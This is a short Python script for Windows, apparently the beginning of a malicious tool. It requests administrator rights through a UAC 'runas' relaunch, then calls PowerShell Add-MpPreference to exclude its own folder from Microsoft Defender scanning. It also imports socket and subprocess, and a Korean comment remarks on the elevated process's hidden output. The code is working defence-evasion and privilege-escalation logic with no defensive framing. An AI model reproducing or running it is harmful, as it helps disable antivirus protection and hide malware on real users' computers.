
import os,socket,subprocess
import time,sys

import win32com.shell.shell as shell

### UAC to get Admins
#다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
def pop_UAC():
    print("UAC start...")
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script]+sys.argv[1:]+['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
        sys.exit(0)
def add_exception_cwd():
    script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
    subprocess.call(script,shell=True)